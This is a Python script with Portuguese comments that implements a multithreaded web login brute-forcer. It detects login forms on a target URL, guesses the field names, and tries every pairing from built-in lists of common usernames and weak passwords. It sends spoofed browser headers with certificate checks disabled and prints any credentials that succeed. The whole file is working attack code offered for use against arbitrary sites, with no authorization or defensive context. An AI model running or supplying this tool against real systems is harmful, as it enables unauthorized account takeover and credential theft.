#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
import urllib3
import re
import time

# Suprimir warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebBruteforce:
    def __init__(self, target_url):
        self.target_url = target_url
        self.found_credentials = []
        self.session = requests.Session()
        self.session.verify = False
        
    def load_wordlists(self):
        """Carrega wordlists de usuários e senhas"""
        # Usuários comuns
        users = [
            'admin', 'administrator', 'root', 'user', 'test', 'demo',
            'guest', 'operator', 'manager', 'supervisor', 'sysadmin',
            'webmaster', 'admin1', 'admin2', 'admin3', 'operator1',
            'user1', 'user2', 'test1', 'test2', 'demo1', 'guest1'
        ]
        
        # Senhas comuns
        passwords = [
            'admin', 'password', '123456', '12345678', '1234', '12345',
            'qwerty', 'abc123', 'password1', '123456789', 'admin123',
            'welcome', 'monkey', 'letmein', 'master', 'root', 'pass',
            'pass123', 'passw0rd', 'p@ssw0rd', 'p@ssword', 'senha',
            '123', 'test', 'demo', 'guest', 'default', 'blank',
            'password123', 'admin@123', 'Admin@123', 'Admin123',
            'administrator', '1234567890', '000000', '111111', '123123'
        ]
        
        return users, passwords

    def detect_login_form(self, url):
        """Detecta se a página tem formulário de login"""
        try:
            response = self.session.get(url, timeout=5)
            
            # Procura por formulários de login
            form_patterns = [
                r'<form[^>]*login[^>]*>',
                r'<form[^>]*signin[^>]*>',
                r'<form[^>]*auth[^>]*>',
                r'<input[^>]*type=["\']password["\'][^>]*>'
            ]
            
            for pattern in form_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True
            
            # Procura por campos de usuário e senha
            if ('password' in response.text.lower() and 
                ('username' in response.text.lower() or 'user' in response.text.lower())):
                return True
                
        except:
            pass
        
        return False

    def find_login_parameters(self, url):
        """Tenta descobrir os parâmetros do formulário de login"""
        try:
            response = self.session.get(url, timeout=5)
            
            # Padrões comuns de campos
            username_fields = ['username', 'user', 'email', 'login', 'usuario']
            password_fields = ['password', 'pass', 'senha', 'pwd']
            
            # Procura em formulários
            forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
            
            for form in forms:
                # Procura campos de input
                inputs = re.findall(r'<input[^>]*>', form, re.IGNORECASE)
                
                username_param = None
                password_param = None
                
                for input_tag in inputs:
                    name_match = re.search(r'name=["\']([^"\']*)["\']', input_tag)
                    if name_match:
                        field_name = name_match.group(1).lower()
                        
                        if any(user_field in field_name for user_field in username_fields):
                            username_param = field_name
                        elif any(pass_field in field_name for pass_field in password_fields):
                            password_param = field_name
                
                if username_param and password_param:
                    return username_param, password_param
        
        except:
            pass
        
        # Fallback para nomes padrão
        return 'username', 'password'

    def try_login(self, url, username, password, username_field, password_field):
        """Tenta fazer login com credenciais específicas"""
        try:
            # Prepara os dados do formulário
            login_data = {
                username_field: username,
                password_field: password
            }
            
            # Headers realistas
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            # Faz a requisição POST
            response = self.session.post(
                url, 
                data=login_data, 
                headers=headers, 
                timeout=5,
                allow_redirects=True
            )
            
            # Verifica se o login foi bem-sucedido
            if self.is_login_successful(response, username, password):
                self.found_credentials.append((username, password))
                print(f"[+] 💥 LOGIN BEM-SUCEDIDO! {username}:{password}")
                return True
                
        except Exception as e:
            pass
        
        return False

    def is_login_successful(self, response, username, password):
        """Verifica se o login foi bem-sucedido baseado na resposta"""
        # Indicadores de login falho
        failure_indicators = [
            'invalid', 'incorrect', 'error', 'failed', 'falhou',
            'wrong', 'incorreto', 'inválido', 'tente novamente'
        ]
        
        # Verifica se há indicadores de falha
        response_lower = response.text.lower()
        if any(indicator in response_lower for indicator in failure_indicators):
            return False
        
        # Verifica mudanças na URL (redirecionamento após login)
        if response.url != self.target_url and 'login' not in response.url.lower():
            return True
        
        # Verifica por elementos que só aparecem após login
        success_indicators = [
            'logout', 'sign out', 'sair', 'dashboard', 'painel',
            'welcome', 'bem-vindo', 'my account', 'minha conta'
        ]
        
        if any(indicator in response_lower for indicator in success_indicators):
            return True
        
        # Se não há indicadores claros, considera baseado no status code e conteúdo
        if response.status_code == 200 and len(response.text) > 1000:
            # Página grande pode indicar área logada
            return True
        
        return False

    def bruteforce_login(self, url, threads=10):
        """Executa bruteforce no formulário de login"""
        print(f"[*] Iniciando bruteforce web em: {url}")
        
        # Detecta se é página de login
        if not self.detect_login_form(url):
            print("[-] Não foi detectado formulário de login")
            return []
        
        print("[+] Formulário de login detectado!")
        
        # Encontra parâmetros do formulário
        username_field, password_field = self.find_login_parameters(url)
        print(f"[*] Campos detectados: {username_field}, {password_field}")
        
        # Carrega wordlists
        users, passwords = self.load_wordlists()
        print(f"[*] Wordlists carregadas: {len(users)} usuários, {len(passwords)} senhas")
        print(f"[*] Total de combinações: {len(users) * len(passwords)}")
        
        # Prepara para multithreading
        credentials_tried = 0
        lock = threading.Lock()
        
        def worker(user_pass_combo):
            nonlocal credentials_tried
            username, password = user_pass_combo
            
            with lock:
                credentials_tried += 1
                if credentials_tried % 50 == 0:
                    print(f"[*] Testadas {credentials_tried} combinações...")
            
            if self.try_login(url, username, password, username_field, password_field):
                return (username, password)
            return None
        
        # Gera todas as combinações
        combinations = [(u, p) for u in users for p in passwords]
        
        print("[*] Iniciando bruteforce...")
        with ThreadPoolExecutor(max_workers=threads) as executor:
            results = executor.map(worker, combinations)
        
        # Filtra resultados
        successful_logins = [r for r in results if r is not None]
        
        print(f"\n[+] Bruteforce finalizado!")
        print(f"    → Combinações testadas: {credentials_tried}")
        print(f"    → Logins bem-sucedidos: {len(successful_logins)}")
        
        return successful_logins

    def scan_and_bruteforce(self, threads=10):
        """Escaneia a URL e executa bruteforce se encontrar login"""
        print(f"[*] Analisando: {self.target_url}")
        
        # Verifica se a URL está acessível
        try:
            response = self.session.get(self.target_url, timeout=5)
            if response.status_code != 200:
                print(f"[-] URL não acessível (status: {response.status_code})")
                return []
        except:
            print("[-] Não foi possível acessar a URL")
            return []
        
        # Executa bruteforce
        return self.bruteforce_login(self.target_url, threads)
